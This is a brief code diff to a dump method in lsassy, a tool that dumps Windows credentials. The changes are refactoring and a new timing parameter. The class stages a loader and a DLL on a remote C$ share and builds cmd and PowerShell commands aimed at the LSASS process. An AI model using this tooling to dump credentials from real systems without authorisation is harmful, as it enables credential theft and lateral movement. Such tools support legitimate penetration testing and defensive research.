@@ -1,4 +1,4 @@
-from lsassy.dumpmethod import IDumpMethod, Dependency
+from lsassy.dumpmethod import Dependency, IDumpMethod
 
 
 class DumpMethod(IDumpMethod):
@@ -9,8 +9,8 @@ class DumpMethod(IDumpMethod):
     dump_share = "C$"
     dump_path = "\\Windows\\Temp\\"
 
-    def __init__(self, session, timeout):
-        super().__init__(session, timeout)
+    def __init__(self, session, timeout, time_between_commands):
+        super().__init__(session, timeout, time_between_commands)
         self.loader = Dependency("loader", "loader.exe")
         self.dll = Dependency("dll", "calc.dll")
 
@@ -27,7 +27,4 @@ class DumpMethod(IDumpMethod):
         pwsh_command = """{}{} (Get-Process lsass).Id""".format(
             self.loader.remote_path, self.loader.file
         )
-        return {
-            "cmd": cmd_command,
-            "pwsh": pwsh_command
-        }
+        return {"cmd": cmd_command, "pwsh": pwsh_command}
